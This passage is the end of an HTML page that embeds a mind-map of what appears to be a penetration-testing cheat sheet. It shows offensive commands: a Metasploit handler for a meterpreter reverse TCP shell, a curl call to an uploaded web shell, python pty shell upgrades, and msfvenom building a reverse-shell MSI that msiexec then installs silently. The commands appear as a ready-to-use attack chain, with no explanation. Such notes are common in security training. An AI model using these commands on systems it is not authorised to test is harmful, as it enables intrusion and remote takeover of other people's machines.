movement","children":[],"payload":{"tag":"li","lines":"721,723"}}],"payload":{"tag":"h2","lines":"718,719"}},{"content":"Metasploit","children":[{"content":"<pre data-lines=\"726,734\"><code class=\"language-bash\">msfconsole\nuse exploit/multi/handler\n<span class=\"hljs-built_in\">set</span> payload linux/x86/meterpreter/reverse_tcp\n<span class=\"hljs-built_in\">set</span> LHOST &lt;ip&gt;\n<span class=\"hljs-built_in\">set</span> LPORT 4444\nrun\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"726,734"}}],"payload":{"tag":"h2","lines":"723,724"}}],"payload":{"tag":"h1","lines":"704,705"}},{"content":"Example Chains (Enumeration  Exploitation  Shell  Escalation)","children":[{"content":"Linux Chain","children":[{"content":"<pre data-lines=\"745,748\"><code class=\"language-bash\">curl http://target/upload/shell.php?cmd=<span class=\"hljs-built_in\">whoami</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"745,748"}},{"content":"<pre data-lines=\"749,752\"><code class=\"language-bash\">python3 -c <span class=\"hljs-string\">&apos;import pty;pty.spawn(&quot;/bin/bash&quot;)&apos;</span>\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"749,752"}},{"content":"<pre data-lines=\"754,757\"><code class=\"language-bash\">/usr/bin/env /bin/sh\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"754,757"}}],"payload":{"tag":"h2","lines":"739,740"}},{"content":"Windows Chain","children":[{"content":"<pre data-lines=\"765,768\"><code class=\"language-bash\">msfvenom -p windows/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=4444 -f msi &gt; shell.msi\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"765,768"}},{"content":"<pre data-lines=\"769,772\"><code class=\"language-powershell\">msiexec /quiet /qn /i shell.msi\n</code></pre>","children":[],"payload":{"tag":"pre","lines":"769,772"}}],"payload":{"tag":"h2","lines":"758,759"}}],"payload":{"tag":"h1","lines":"737,738"}}]},{"initialExpandLevel":1,"maxWidth":300,"activeNode":{"placement":"center"}})</script>
</body>
</html>
